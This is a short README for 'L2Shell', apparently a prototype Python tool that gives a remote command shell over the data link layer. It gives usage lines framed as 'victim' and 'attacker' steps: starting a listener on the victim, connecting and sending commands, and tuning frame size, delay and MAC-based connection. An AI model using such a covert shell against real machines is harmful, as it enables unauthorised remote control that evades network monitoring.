# L2Shell
L2Shell is an opensource tool used for communications via data link layer.
This script should work for both windows and linux systems.

### Usage
```
python l2shell.py -h
```

### On victim machine:
```
python l2shell.py -l -a <attacker_id> -s <session_id>
```

### On Attacker machine
```
python l2shell.py -c -a <attacker_id> -s <session_id>
```

### Sending command (from attacker host)
```
> <command>
```

### enable options (from attacker host)
```
> enable options
```

### Changing framesize (victim)
```
python l2shell.py -l -f <frame_size> -a <attacker_id> -s <session_id>
```

### Changing chunked request delay (victim)
```
python l2shell.py -l -d <delay> -a <attacker_id> -s <session_id>
```

### Connect to Victim via Mac address - Victim responds with broadcasts
```
python l2shell.py -c -m <aa:aa:aa:aa:aa:aa> -a <attacker_id> -s <session_id>
```

### Requirements
- pcap
- scapy

`note: commands and readme are temporary for the prototype`
